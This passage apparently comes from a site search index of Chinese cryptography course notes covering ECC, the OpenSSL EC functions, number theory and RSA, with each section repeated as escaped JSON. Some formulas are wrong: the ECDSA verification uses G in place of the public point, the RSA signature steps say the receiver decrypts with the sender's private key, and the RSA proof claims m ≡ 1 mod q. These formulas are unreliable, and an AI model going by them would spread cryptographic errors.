\u52a0\u5bc6(r(x),s) r(x) = (k * G).x mod p, \u5176\u4e2dk < n, r(x)\u7ed3\u679c\u4e0d\u80fd\u5bf9n\u53d6\u6a21\uff0c\u800c\u662f\u5bf9p\u53d6\u6a21 s = m * (k * R).x mod n, \u5176\u4e2dm\u4e3a\u660e\u6587 \u89e3\u5bc6(\u5229\u7528\u79c1\u94a5d) \u901a\u8fc7r(x)\u63a8\u51fa\u70b9r m = s / (r * d).x = (m * (k * R).x) / (k * G * d).x = (m * (kd * G).x) / (kd * G).x = m ECC\u7b97\u6cd5\u7b7e\u540d ecdsa(elliptic curve digital signature) \u7b7e\u540d(r,s) r = k * G s = (m + r * d)/k \u9a8c\u8bc1: (m / s) * G + (r / s) * G == r ecnr \u7b7e\u540d(r,s) r = (k * G).x + m s = k - (r * d).x \u9a8c\u8bc1: r - (s * G + r * R) == m","title":"ECC"},{"location":"course/crypto/ECC/#ecc","text":"\u692d\u5706\u66f2\u7ebf\u53ef\u4ee5\u5b9a\u4e49\u4e3a\u6240\u6709\u6ee1\u8db3\u65b9\u7a0b \\(E: y^2=x^3+ax+b\\) \u7684\u70b9(x,y)\u6240\u6784\u6210\u7684\u96c6\u5408\u3002","title":"ECC"},{"location":"course/crypto/ECC/#ecc_1","text":"a\uff0cb\uff1a\u692d\u5706\u66f2\u7ebf\u7cfb\u6570 p\uff1a\u6a21\u6570 \u57fa\u70b9G\uff08\u66f2\u7ebf\u4e0a\u7684\u4e00\u4e2a\u70b9\uff09 G\u7684\u9636n (n * G = O) \u4f59\u56e0\u5b50 = \u66f2\u7ebf\u7684\u9636/G\u7684\u9636","title":"ECC\u7b97\u6cd5\u7684\u516d\u8981\u7d20"},{"location":"course/crypto/ECC/#ecc_2","text":"\u692d\u5706\u66f2\u7ebf\u5728\u7d20\u57df \\(Z_p\\) \u4e0a\u7684\u8fd0\u7b97\u89c4\u5219 P+O=O+P=P; \u82e5P( \\(x_1\\) , \\(y_1\\) ), Q( \\(x_2\\) , \\(y_2\\) )\u6ee1\u8db3 \\(x_1=x_2,y_1+y_2=0\\) \uff0c\u5219P+Q=O; \u82e5P( \\(x_1\\) , \\(y_1\\) ), Q( \\(x_2\\) , \\(y_2\\) )\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u6027\u8d28\uff0c\u5219 \\(x_3 = \\lambda^2-x_1-x_2\\) \\(y_3=\\lambda(x_1-x_3)-y_1\\) \u82e5 \\(P\\ne Q\\) \uff0c \\(\\lambda=(y_2-y_1)/(x_2-x_1)\\) ; \u82e5 \\(P=Q\\) \uff0c \\(\\lambda=(3x_1^2+a)/(2y_1)\\) . \u692d\u5706\u66f2\u7ebf\u7684\u4e58\u6cd5\u6027\u8d28 \u82e5 \\(Q=k*P\\) (k<n)\uff0c\u5176\u4e2dk\u662f\u5e38\u6570\uff0cQ\u3001P\u662f\u66f2\u7ebf\u4e0a\u7684\u70b9\uff0c\u5219\u901a\u8fc7k,P\u8ba1\u7b97Q\u7b80\u5355\uff0c\u4f46\u662f\u901a\u8fc7Q\u3001P\u63a8\u7b97k\u8f83\u4e3a\u590d\u6742\u3002","title":"ECC\u7b97\u6cd5\u7684\u6570\u5b66\u57fa\u7840"},{"location":"course/crypto/ECC/#opensslecc","text":"\u521b\u5efagroup EC_GROUP *group=EC_GROUP_new(EC_GFp_simple_method()); a,b,p\u521d\u59cb\u5316group EC_GROUP_set_curve_GFp(group,p,a,b,ctx); \u521b\u5efa\u57fa\u70b9G\u5e76\u901a\u8fc7tx,ty\u521d\u59cb\u5316 G=EC_POINT_new(group); EC_POINT_set_affine_coordinates_GFp(group,G,tx,ty,ctx); G,n,\u4f59\u56e0\u5b50(1)\u8bbe\u7f6egroup EC_GROUP_set_generator(group, G, n, BN_value_one()); \u83b7\u5f97\u70b9T\u7684\u5750\u6807(tx,ty) EC_POINT_get_affine_coordinates_GFp(group,T,tx,ty,ctx) ECC\u4e0a\u7684\u52a0\u6cd5 T = T + G EC_POINT_add(group,T,T,G,ctx) ECC\u4e0a\u7684\u4e58\u6cd5 T = m * G EC_POINT_mul(group,T,m,NULL,NULL,ctx) T = m * G + n * P EC_POINT_mul(group,T,m,P,n,ctx)","title":"OpenSSL\u4e2d\u7684ECC\u5e93"},{"location":"course/crypto/ECC/#ecc_3","text":"\u516c\u94a5(\u516c\u94a5\u70b9) R = d * G \u79c1\u94a5 d (d < n) \u52a0\u5bc6(r(x),s) r(x) = (k * G).x mod p, \u5176\u4e2dk < n, r(x)\u7ed3\u679c\u4e0d\u80fd\u5bf9n\u53d6\u6a21\uff0c\u800c\u662f\u5bf9p\u53d6\u6a21 s = m * (k * R).x mod n, \u5176\u4e2dm\u4e3a\u660e\u6587 \u89e3\u5bc6(\u5229\u7528\u79c1\u94a5d) \u901a\u8fc7r(x)\u63a8\u51fa\u70b9r m = s / (r * d).x = (m * (k * R).x) / (k * G * d).x = (m * (kd * G).x) / (kd * G).x = m","title":"ECC\u52a0\u5bc6\u89e3\u5bc6"},{"location":"course/crypto/ECC/#ecc_4","text":"ecdsa(elliptic curve digital signature) \u7b7e\u540d(r,s) r = k * G s = (m + r * d)/k \u9a8c\u8bc1: (m / s) * G + (r / s) * G == r ecnr \u7b7e\u540d(r,s) r = (k * G).x + m s = k - (r * d).x \u9a8c\u8bc1: r - (s * G + r * R) == m","title":"ECC\u7b97\u6cd5\u7b7e\u540d"},{"location":"course/crypto/Math/","text":"\u6570\u5b66\u57fa\u7840 \u6700\u5927\u516c\u7ea6\u6570 \u8bbea\u3001b\u4e3a\u6574\u6570\uff0c\u4e14a\u3001b\u4e2d\u81f3\u5c11\u6709\u4e00\u4e2a\u4e0d\u7b49\u4e8e0\uff0c\u4ee4d=gcd(a,b)\uff0c\u5219\u4e00\u5b9a\u5b58\u5728\u6574\u6570x\u3001y\u4f7f\u5f97\u4e0b\u5f0f\u6210\u7acb\uff1a \\(a\\times x + b\\times y = d\\) \u7d20\u6570\u4e0e\u4e92\u7d20 \u82e5gcd(a, b) = 1\uff0c\u5219\u79f0a\u3001b\u4e92\u7d20 \u6a21\u8fd0\u7b97\u4e0e\u540c\u4f59 \\(a \\equiv b \\mod n\\) \u53ef\u4ee5\u7406\u89e3\u4e3a a%n == b%n \u9006\u5143(inverse) \u52a0\u6cd5\u9006\u5143 \\(a+b=0 \\mod n\\) \\(\u660e\u6587+\u5bc6\u94a5 \\equiv \u5bc6\u6587 \\mod n\\) \uff0c \\(\u5bc6\u6587+\u5bc6\u94a5\u9006\u5143\\equiv \u660e\u6587 \\mod n\\) \u4e58\u6cd5\u9006\u5143 \\(a*b=1 \\mod n\\) \\(\u660e\u6587\\times\u5bc6\u94a5 \\equiv \u5bc6\u6587 \\mod n\\) \uff0c \\(\u5bc6\u6587\\times\u5bc6\u94a5\u9006\u5143\\equiv \u660e\u6587 \\mod n\\) \u5145\u8981\u6761\u4ef6 \\(\\gcd(a,n)=1\\) \u6c42\u6cd5\uff1a\u6269\u5c55\u6b27\u51e0\u91cc\u5f97 \u62d3\u5c55\u6b27\u51e0\u91cc\u5f97 \u62d3\u5c55\u6b27\u51e0\u91cc\u5f97\u53ef\u4ee5\u7528\u6765\u6c42\u4e58\u6cd5\u9006\u5143\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff1a \u4f8b\u5982\u6c42 13*x \u2261 1 (mod 35) 35 = 2*13+ 9 13 = 1*9 + 4 9 = 2*4 + 1 1 = 9-(2*4) = (35 - 2*13) - (2*(13-1*9)) = 35 - 2*13 - 2*(13-1*(35-2*13)) = 35 - 2*13 - 2*13 + 2*(35-2*13) = 3*35 - 8*13 \u6240\u4ee5 (-8)*13 \u2261 1 (mod 35) \u53c8\u56e0\u4e3a -8 \u2261 27 (mod 35) \u6240\u4ee5 13*27 \u2261 1 (mod 35) 13\u5728\u6a2135\u7684\u60c5\u51b5\u4e0b\uff0c\u4e58\u6cd5\u9006\u5143\u4e3a27 \u88f4\u8700\u5b9a\u7406 gcd(x,y) = ax + by \u6839\u636e\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5 x = x0 ; y = y0 ; while ( y ){ int q = y / x ; int r = y % x ; y = x ; x = r ; } \u8bc1\u660e\uff0c\u5728\u6bcf\u4e00\u8f6e\u5faa\u73af\u4e2d\uff0c\u90fd\u6709 \\[ \\begin{aligned} &x_i = a_{i1}x_0+b_{i1}y_0\\\\ &y_i = a_{i2}x_0+b_{i2}y_0\\\\ \\end{aligned} \\] \u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5 i = 1\u65f6\uff0c \\(x = x_0\\) \uff0c \\(y = y_0\\) \uff0c\u5373 \\(a_{i1}=1,b_{i1}=0,a_{i2}=0,b_{i2}=1\\) i >= 1\u65f6\uff0c\u82e5i\u6ee1\u8db3\u4e0a\u8ff0\u6761\u4ef6\uff0c\u5219 \\(y_{i+1} = x_i = a_{i1}x_0 + b_{i1}y_0\\) \uff0c \\(a_{(i+1)2}=a_{i1},b_{(i+1)2}=b_{i1}\\) \\(x_{i+1}=y_{i}\\%x_{i}=(a_{i2}x_0+b_{i2}y)-k*(a_{i1}x_0+b_{i1}y_0)=(a_{i2}-ka_{i1})x_0+(b_{i2}-kb_{i1})y_0\\) \uff0c \\(a_{(i+1)1}=a_{i2}-ka_{i1}\\) \uff0c \\(b_{(i+1)1}=b_{i2}-kb_{i1}\\) Q.E.D \u4e2d\u56fd\u5269\u4f59\u5b9a\u7406 \u8bbe \\(m_1,m_2,m_3,...,m_r\\) \u4e24\u4e24\u4e92\u7d20\uff0c\u5219\u4ee5\u4e0b\u540c\u4f59\u65b9\u7a0b\u7ec4 \\(x\\equiv a_i\\mod m_i,\\ i=1,2,3,...,r\\) \u6a21 \\(M=m_1m_2m_3...m_r\\) \u7684\u552f\u4e00\u89e3\u4e3a \\(x=\\sum\\limits^{r}_{i=1}a_i*M_i*(M_i^{-1}{\\rm \\ mod\\ }m_i)\\mod M\\) \uff0c\u5176\u4e2d \\(M_i=M/m_i\\) \uff081\uff09\u5148\u8bc1\u660ex\u4e3a\u540c\u4f59\u65b9\u7a0b\u7684\u89e3 \u56e0\u4e3a \\(M_i\\equiv 0\\mod m_j(i\\ne j)\\) \uff0c\u6240\u4ee5 \\(x\\equiv a_j\\mod m_j\\) \uff082\uff09\u518d\u8bc1\u660ex\u662f\u552f\u4e00\u89e3 \u5047\u8bbe\u4e0a\u8ff0\u540c\u4f59\u65b9\u7a0b\u7ec4\u6709\u4e24\u4e2a\u89e3 \\(0\\le x_1,x_2< M\\) \uff0c \u5219 \\[ \\begin{aligned} x_1&\\equiv a_i\\mod m_i\\\\ x_2&\\equiv a_i\\mod m_i\\\\ \\to x_1-x_2&\\equiv 0 \\mod m_i \\end{aligned} \\] \u53c8\u56e0\u4e3a \\(m_1,m_2,m_3,...,m_r\\) \u4e24\u4e24\u4e92\u7d20\uff0c\u6240\u4ee5 \\(x_1 = k*M+x_2\\) \uff0c\u4e0e\u5047\u8bbe\u77db\u76fe Q.E.D Euler\u51c6\u5219 \u5bf9\u4e8e\u6574\u6570x\u548c\u5947\u7d20\u6570p\uff0cx\u662f\u6a21p\u7684\u5e73\u65b9\u5269\u4f59\uff08 \\(y^2\\equiv x \\mod p\\) \uff09 \u7684\u5145\u8981\u6761\u4ef6\u662f \\(x^{(p-1)/2}\\equiv 1 \\mod p\\) \u8bc1\u660e\uff1a \uff081\uff09\u5fc5\u8981\u6027 \u56e0\u4e3agcd(x,p)=1, \\(y^2\\equiv x\\mod p\\) \uff0c \u6240\u4ee5gcd(y,p)=1 \u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c \\(y^{p-1}\\equiv 1 \\mod p\\) \u6240\u4ee5 \\(x^{(p-1)/2}\\equiv 1\\mod p\\) \uff082\uff09\u5145\u5206\u6027 \u4e0d\u59a8\u8bbe \\(x\\in Z_p\\) \uff0c\u56e0\u4e3a \\(Z_p^{*}\\) ={1,2,3,...,p-1}\u5728\u6a21p\u4e58\u6cd5\u4e0b\u662f\u5faa\u73af\u7fa4\uff0c\u6240\u4ee5\u4e00\u5b9a\u5b58\u5728 \\(Z_p^*\\) \u7684\u4e00\u4e2a\u751f\u6210\u5143b\uff0c\u4f7f\u5f97 \\(x\\equiv b^i\\mod p\\) \u56e0\u4e3a \\(x^{(p-1)/2}\\equiv 1\\mod p\\) \u6240\u4ee5 \\(b^{i(p-1)/2}=(b^{p-1})^{i/2}\\equiv 1\\mod p\\) \u53c8\u56e0\u4e3a \\(b^{p-1}\\equiv 1\\mod p\\) \uff0c\u6240\u4ee5i\u4e3a\u5076\u6570 \u6240\u4ee5x\u6a21p\u7684\u5e73\u65b9\u6839\u5fc5\u6709\u6574\u6570\u89e3\uff0c\u5176\u503c\u4e3a \\(\\pm b^{i/2}\\) Q.E.D","title":"\u6570\u5b66\u57fa\u7840"},{"location":"course/crypto/Math/#_1","text":"","title":"\u6570\u5b66\u57fa\u7840"},{"location":"course/crypto/Math/#_2","text":"\u8bbea\u3001b\u4e3a\u6574\u6570\uff0c\u4e14a\u3001b\u4e2d\u81f3\u5c11\u6709\u4e00\u4e2a\u4e0d\u7b49\u4e8e0\uff0c\u4ee4d=gcd(a,b)\uff0c\u5219\u4e00\u5b9a\u5b58\u5728\u6574\u6570x\u3001y\u4f7f\u5f97\u4e0b\u5f0f\u6210\u7acb\uff1a \\(a\\times x + b\\times y = d\\)","title":"\u6700\u5927\u516c\u7ea6\u6570"},{"location":"course/crypto/Math/#_3","text":"\u82e5gcd(a, b) = 1\uff0c\u5219\u79f0a\u3001b\u4e92\u7d20","title":"\u7d20\u6570\u4e0e\u4e92\u7d20"},{"location":"course/crypto/Math/#_4","text":"\\(a \\equiv b \\mod n\\) \u53ef\u4ee5\u7406\u89e3\u4e3a a%n == b%n","title":"\u6a21\u8fd0\u7b97\u4e0e\u540c\u4f59"},{"location":"course/crypto/Math/#inverse","text":"\u52a0\u6cd5\u9006\u5143 \\(a+b=0 \\mod n\\) \\(\u660e\u6587+\u5bc6\u94a5 \\equiv \u5bc6\u6587 \\mod n\\) \uff0c \\(\u5bc6\u6587+\u5bc6\u94a5\u9006\u5143\\equiv \u660e\u6587 \\mod n\\) \u4e58\u6cd5\u9006\u5143 \\(a*b=1 \\mod n\\) \\(\u660e\u6587\\times\u5bc6\u94a5 \\equiv \u5bc6\u6587 \\mod n\\) \uff0c \\(\u5bc6\u6587\\times\u5bc6\u94a5\u9006\u5143\\equiv \u660e\u6587 \\mod n\\) \u5145\u8981\u6761\u4ef6 \\(\\gcd(a,n)=1\\) \u6c42\u6cd5\uff1a\u6269\u5c55\u6b27\u51e0\u91cc\u5f97","title":"\u9006\u5143(inverse)"},{"location":"course/crypto/Math/#_5","text":"\u62d3\u5c55\u6b27\u51e0\u91cc\u5f97\u53ef\u4ee5\u7528\u6765\u6c42\u4e58\u6cd5\u9006\u5143\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff1a \u4f8b\u5982\u6c42 13*x \u2261 1 (mod 35) 35 = 2*13+ 9 13 = 1*9 + 4 9 = 2*4 + 1 1 = 9-(2*4) = (35 - 2*13) - (2*(13-1*9)) = 35 - 2*13 - 2*(13-1*(35-2*13)) = 35 - 2*13 - 2*13 + 2*(35-2*13) = 3*35 - 8*13 \u6240\u4ee5 (-8)*13 \u2261 1 (mod 35) \u53c8\u56e0\u4e3a -8 \u2261 27 (mod 35) \u6240\u4ee5 13*27 \u2261 1 (mod 35) 13\u5728\u6a2135\u7684\u60c5\u51b5\u4e0b\uff0c\u4e58\u6cd5\u9006\u5143\u4e3a27","title":"\u62d3\u5c55\u6b27\u51e0\u91cc\u5f97"},{"location":"course/crypto/Math/#gcdxy-ax-by","text":"\u6839\u636e\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5 x = x0 ; y = y0 ; while ( y ){ int q = y / x ; int r = y % x ; y = x ; x = r ; } \u8bc1\u660e\uff0c\u5728\u6bcf\u4e00\u8f6e\u5faa\u73af\u4e2d\uff0c\u90fd\u6709 \\[ \\begin{aligned} &x_i = a_{i1}x_0+b_{i1}y_0\\\\ &y_i = a_{i2}x_0+b_{i2}y_0\\\\ \\end{aligned} \\] \u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5 i = 1\u65f6\uff0c \\(x = x_0\\) \uff0c \\(y = y_0\\) \uff0c\u5373 \\(a_{i1}=1,b_{i1}=0,a_{i2}=0,b_{i2}=1\\) i >= 1\u65f6\uff0c\u82e5i\u6ee1\u8db3\u4e0a\u8ff0\u6761\u4ef6\uff0c\u5219 \\(y_{i+1} = x_i = a_{i1}x_0 + b_{i1}y_0\\) \uff0c \\(a_{(i+1)2}=a_{i1},b_{(i+1)2}=b_{i1}\\) \\(x_{i+1}=y_{i}\\%x_{i}=(a_{i2}x_0+b_{i2}y)-k*(a_{i1}x_0+b_{i1}y_0)=(a_{i2}-ka_{i1})x_0+(b_{i2}-kb_{i1})y_0\\) \uff0c \\(a_{(i+1)1}=a_{i2}-ka_{i1}\\) \uff0c \\(b_{(i+1)1}=b_{i2}-kb_{i1}\\) Q.E.D","title":"\u88f4\u8700\u5b9a\u7406 gcd(x,y) = ax + by"},{"location":"course/crypto/Math/#_6","text":"\u8bbe \\(m_1,m_2,m_3,...,m_r\\) \u4e24\u4e24\u4e92\u7d20\uff0c\u5219\u4ee5\u4e0b\u540c\u4f59\u65b9\u7a0b\u7ec4 \\(x\\equiv a_i\\mod m_i,\\ i=1,2,3,...,r\\) \u6a21 \\(M=m_1m_2m_3...m_r\\) \u7684\u552f\u4e00\u89e3\u4e3a \\(x=\\sum\\limits^{r}_{i=1}a_i*M_i*(M_i^{-1}{\\rm \\ mod\\ }m_i)\\mod M\\) \uff0c\u5176\u4e2d \\(M_i=M/m_i\\) \uff081\uff09\u5148\u8bc1\u660ex\u4e3a\u540c\u4f59\u65b9\u7a0b\u7684\u89e3 \u56e0\u4e3a \\(M_i\\equiv 0\\mod m_j(i\\ne j)\\) \uff0c\u6240\u4ee5 \\(x\\equiv a_j\\mod m_j\\) \uff082\uff09\u518d\u8bc1\u660ex\u662f\u552f\u4e00\u89e3 \u5047\u8bbe\u4e0a\u8ff0\u540c\u4f59\u65b9\u7a0b\u7ec4\u6709\u4e24\u4e2a\u89e3 \\(0\\le x_1,x_2< M\\) \uff0c \u5219 \\[ \\begin{aligned} x_1&\\equiv a_i\\mod m_i\\\\ x_2&\\equiv a_i\\mod m_i\\\\ \\to x_1-x_2&\\equiv 0 \\mod m_i \\end{aligned} \\] \u53c8\u56e0\u4e3a \\(m_1,m_2,m_3,...,m_r\\) \u4e24\u4e24\u4e92\u7d20\uff0c\u6240\u4ee5 \\(x_1 = k*M+x_2\\) \uff0c\u4e0e\u5047\u8bbe\u77db\u76fe Q.E.D","title":"\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406"},{"location":"course/crypto/Math/#euler","text":"\u5bf9\u4e8e\u6574\u6570x\u548c\u5947\u7d20\u6570p\uff0cx\u662f\u6a21p\u7684\u5e73\u65b9\u5269\u4f59\uff08 \\(y^2\\equiv x \\mod p\\) \uff09 \u7684\u5145\u8981\u6761\u4ef6\u662f \\(x^{(p-1)/2}\\equiv 1 \\mod p\\) \u8bc1\u660e\uff1a \uff081\uff09\u5fc5\u8981\u6027 \u56e0\u4e3agcd(x,p)=1, \\(y^2\\equiv x\\mod p\\) \uff0c \u6240\u4ee5gcd(y,p)=1 \u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c \\(y^{p-1}\\equiv 1 \\mod p\\) \u6240\u4ee5 \\(x^{(p-1)/2}\\equiv 1\\mod p\\) \uff082\uff09\u5145\u5206\u6027 \u4e0d\u59a8\u8bbe \\(x\\in Z_p\\) \uff0c\u56e0\u4e3a \\(Z_p^{*}\\) ={1,2,3,...,p-1}\u5728\u6a21p\u4e58\u6cd5\u4e0b\u662f\u5faa\u73af\u7fa4\uff0c\u6240\u4ee5\u4e00\u5b9a\u5b58\u5728 \\(Z_p^*\\) \u7684\u4e00\u4e2a\u751f\u6210\u5143b\uff0c\u4f7f\u5f97 \\(x\\equiv b^i\\mod p\\) \u56e0\u4e3a \\(x^{(p-1)/2}\\equiv 1\\mod p\\) \u6240\u4ee5 \\(b^{i(p-1)/2}=(b^{p-1})^{i/2}\\equiv 1\\mod p\\) \u53c8\u56e0\u4e3a \\(b^{p-1}\\equiv 1\\mod p\\) \uff0c\u6240\u4ee5i\u4e3a\u5076\u6570 \u6240\u4ee5x\u6a21p\u7684\u5e73\u65b9\u6839\u5fc5\u6709\u6574\u6570\u89e3\uff0c\u5176\u503c\u4e3a \\(\\pm b^{i/2}\\) Q.E.D","title":"Euler\u51c6\u5219"},{"location":"course/crypto/RSA/","text":"RSA Info 2022/6/14 \u4fee\u6b63\u4e86\u5bf9RSA\u6b63\u786e\u6027\u7684\u8bc1\u660e e: \u52a0\u5bc6\u516c\u94a5 d: \u89e3\u5bc6\u5bc6\u94a5 N/n: \u5927\u6570 p,q: \u4e24\u4e2a\u7d20\u6570 m: \u660e\u6587 c: \u5bc6\u6587 \u6570\u5b66\u524d\u63d0 \u6b27\u62c9\u51fd\u6570 \\(\\phi(n)\\) : \u5c0f\u4e8e \\(n\\) \uff0c\u4e14\u4e0e \\(n\\) \u4e92\u7d20\u7684\u6570\u7684\u4e2a\u6570 \u6b27\u62c9\u5b9a\u7406\uff1a\u82e5 \\(gcd(x,n)=1\\) \uff0c\u5219 \\(X^{\\phi(n)}\\equiv 1\\mod n\\) \u8d39\u9a6c\u5c0f\u5b9a\u7406\uff1a\u82e5p\u4e3a\u7d20\u6570\uff0c\u5219 \\(X^{p-1}\\equiv 1 \\mod p\\) \u6b27\u62c9\u51fd\u6570\u7684\u4e58\u6cd5\u6027\u8d28\uff1a\u82e5 \\(\\gcd(x,y)=1\\) \uff0c \\(\\phi(xy)=\\phi(x)\\phi(y)\\) \u5bc6\u94a5\u751f\u6210\u6d41\u7a0b \u9009\u53d6\u4e24\u4e2a\u5927\u7d20\u6570 p \u548c q \u8ba1\u7b97\u51fa n = p * q \u968f\u673a\u9009\u53d6\u52a0\u5bc6\u5bc6\u94a5e(\u516c\u94a5)\uff0c\u4f7f\u5f97 gcd(e,(p-1)(q-1))=1 \u8ba1\u7b97\u51fae\u5728(p-1)(q-1)\u4e0b\u7684\u4e58\u6cd5\u9006\u5143d\uff0c\u4f5c\u4e3a\u89e3\u5bc6\u5bc6\u94a5(\u79c1\u94a5) \u516c\u5f00(e,n)\u4f5c\u4e3a\u516c\u94a5 \u52a0\u89e3\u5bc6 \u52a0\u5bc6 \\(c=m^e\\ {\\rm mod}\\ N\\) \u89e3\u5bc6 \\(m=c^d\\ {\\rm mod}\\ N\\) RSA\u7b7e\u540d \u52a0\u5bc6\u90ae\u4ef6\u7684\u6b65\u9aa4\uff08\u4fe1\u4ef6L\u7531A\u53d1\u7ed9B\uff09 \u4fe1\u4ef6L\u7528B\u7684\u516c\u94a5\u52a0\u5bc6 \u628a\u5185\u5bb9\u53d1\u7ed9B B\u7528\u79c1\u94a5\u89e3\u5bc6\u4fe1\u4ef6 \u9a8c\u8bc1\u90ae\u4ef6\u7684\u6b65\u9aa4\uff08\u4fe1\u4ef6L\u7531A\u53d1\u7ed9B\uff09 L\u505aMD5\u6458\u8981\uff0cM=MD5(L) \u7528A\u7684\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6 M'=RSA(M,A\u7684\u79c1\u94a5) \u628aL\u3001M'\u548cA\u7684\u516c\u94a5\u53d1\u9001\u7ed9B B\u7528A\u7684\u79c1\u94a5\u89e3\u5bc6 m=RSA(M',A\u7684\u516c\u94a5) \u5224\u65adMD5(L)\u662f\u5426\u7b49\u4e8em RSA\u6b63\u786e\u6027\u8bc1\u660e \u5df2\u77e5 \\(c=m^e{\\rm\\ mod}\\ N\\) , \\(ed\\equiv 1 \\mod (p-1)(q-1)\\) , p\u3001q\u4e92\u7d20\uff0c \\(N=p*q\\) \u8bc1\u660e \\(m = c^d{\\rm\\ mod}\\ N\\) Step1 \u516c\u5f0f\u5316\u7b80 \\[ \\begin{aligned} &c^d {\\rm\\ mod}\\ N \\\\ =& (m^e)^d {\\rm\\ mod}\\ N\\\\ =& m^{ed} {\\rm\\ mod}\\ N\\\\ =& m^{k(p-1)(q-1)+1} {\\rm\\ mod}\\ N\\\\ =& m*(m^{(p-1)(q-1)})^k {\\rm\\ mod}\\ N\\\\ \\end{aligned} \\] Step2 \u5206\u7c7b\u8ba8\u8bba\u8bc1\u660e \uff081\uff09\u82e5 \\(\\gcd(m,N)=1\\) \uff0c\u5219 \\(m^{\\phi(N)}\\equiv 1\\mod N\\) \\[ \\begin{aligned} &\\because gcb(p,q)=1,\\phi(p)=p-1,\\phi(q)=q-1\\\\ &\\therefore \\phi(pq)=\\phi(p)\\phi(q)=(p-1)(q-1)\\\\ &\\therefore m^{(p-1)(q-1)}=m^{\\phi(pq)}=m^{\\phi(N)} \\equiv 1\\mod N\\\\ &\\therefore m*(m^{(p-1)(q-1)})^k \\equiv m\\mod\\ N \\end{aligned} \\] \uff082\uff09\u82e5 \\(\\gcd(m,N)\\ne 1\\) \\[ \\begin{aligned} &\\because m<N, \\gcd(m,N)\\ne1\\\\ &\u5047\u8bbe gcd(m,M)=p\\ (m = cp), \u5219 m \\equiv 1 \\mod q\\\\ & \\therefore m^{k(p-1)(q-1)} \\equiv (m^{q-1})^{k(p-1)} \\equiv 1\\mod q\\\\ &\u4ee4 m^{k(p-1)(q-1)}=sq+1\\\\ & \\therefore m*m^{k(p-1)(q-1)} = m * (s*q + 1) = c*s*p*q + m =c*s*N+m\\equiv m \\mod N\\\\ \\end{aligned} \\] QED","title":"RSA"},{"location":"course/crypto/RSA/#rsa","text":"Info 2022/6/14 \u4fee\u6b63\u4e86\u5bf9RSA\u6b63\u786e\u6027\u7684\u8bc1\u660e e: \u52a0\u5bc6\u516c\u94a5 d: \u89e3\u5bc6\u5bc6\u94a5 N/n: \u5927\u6570 p,q: \u4e24\u4e2a\u7d20\u6570 m: \u660e\u6587 c: \u5bc6\u6587","title":"RSA"},{"location":"course/crypto/RSA/#_1","text":"\u6b27\u62c9\u51fd\u6570 \\(\\phi(n)\\) : \u5c0f\u4e8e \\(n\\) \uff0c\u4e14\u4e0e \\(n\\) \u4e92\u7d20\u7684\u6570\u7684\u4e2a\u6570 \u6b27\u62c9\u5b9a\u7406\uff1a\u82e5 \\(gcd(x,n)=1\\) \uff0c\u5219 \\(X^{\\phi(n)}\\equiv 1\\mod n\\) \u8d39\u9a6c\u5c0f\u5b9a\u7406\uff1a\u82e5p\u4e3a\u7d20\u6570\uff0c\u5219 \\(X^{p-1}\\equiv 1 \\mod p\\) \u6b27\u62c9\u51fd\u6570\u7684\u4e58\u6cd5\u6027\u8d28\uff1a\u82e5 \\(\\gcd(x,y)=1\\) \uff0c \\(\\phi(xy)=\\phi(x)\\phi(y)\\)","title":"\u6570\u5b66\u524d\u63d0"},{"location":"course/crypto/RSA/#_2","text":"\u9009\u53d6\u4e24\u4e2a\u5927\u7d20\u6570 p \u548c q \u8ba1\u7b97\u51fa n = p * q \u968f\u673a\u9009\u53d6\u52a0\u5bc6\u5bc6\u94a5e(\u516c\u94a5)\uff0c\u4f7f\u5f97 gcd(e,(p-1)(q-1))=1 \u8ba1\u7b97\u51fae\u5728(p-1)(q-1)\u4e0b\u7684\u4e58\u6cd5\u9006\u5143d\uff0c\u4f5c\u4e3a\u89e3\u5bc6\u5bc6\u94a5(\u79c1\u94a5) \u516c\u5f00(e,n)\u4f5c\u4e3a\u516c\u94a5","title":"\u5bc6\u94a5\u751f\u6210\u6d41\u7a0b"},{"location":"course/crypto/RSA/#_3","text":"\u52a0\u5bc6 \\(c=m^e\\ {\\rm mod}\\ N\\) \u89e3\u5bc6 \\(m=c^d\\ {\\rm mod}\\ N\\)","title":"\u52a0\u89e3\u5bc6"},{"location":"course/crypto/RSA/#rsa_1","text":"\u52a0\u5bc6\u90ae\u4ef6\u7684\u6b65\u9aa4\uff08\u4fe1\u4ef6L\u7531A\u53d1\u7ed9B\uff09 \u4fe1\u4ef6L\u7528B\u7684\u516c\u94a5\u52a0\u5bc6 \u628a\u5185\u5bb9\u53d1\u7ed9B B\u7528\u79c1\u94a5\u89e3\u5bc6\u4fe1\u4ef6 \u9a8c\u8bc1\u90ae\u4ef6\u7684\u6b65\u9aa4\uff08\u4fe1\u4ef6L\u7531A\u53d1\u7ed9B\uff09 L\u505aMD5\u6458\u8981\uff0cM=MD5(L) \u7528A\u7684\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6 M'=RSA(M,A\u7684\u79c1\u94a5) \u628aL\u3001M'\u548cA\u7684\u516c\u94a5\u53d1\u9001\u7ed9B B\u7528A\u7684\u79c1\u94a5\u89e3\u5bc6 m=RSA(M',A\u7684\u516c\u94a5) \u5224\u65adMD5(L)\u662f\u5426\u7b49\u4e8em","title":"RSA\u7b7e\u540d"},{"location":"course/crypto/RSA/#rsa_2","text":"\u5df2\u77e5 \\(c=m^e{\\rm\\ mod}\\ N\\) , \\(ed\\equiv 1 \\mod (p-1)(q-1)\\) , p\u3001q\u4e92\u7d20\uff0c \\(N=p*q\\) \u8bc1\u660e \\(m = c^d{\\rm\\ mod}\\ N\\)","title":"RSA\u6b63\u786e\u6027\u8bc1\u660e"},{"location":"course/crypto/RSA/#step1","text":"\\[ \\begin{aligned} &c^d {\\rm\\ mod}\\ N \\\\ =& (m^e)^d {\\rm\\ mod}\\ N\\\\ =& m^{ed} {\\rm\\ mod}\\ N\\\\ =& m^{k(p-1)(q-1)+1} {\\rm\\ mod}\\ N\\\\ =& 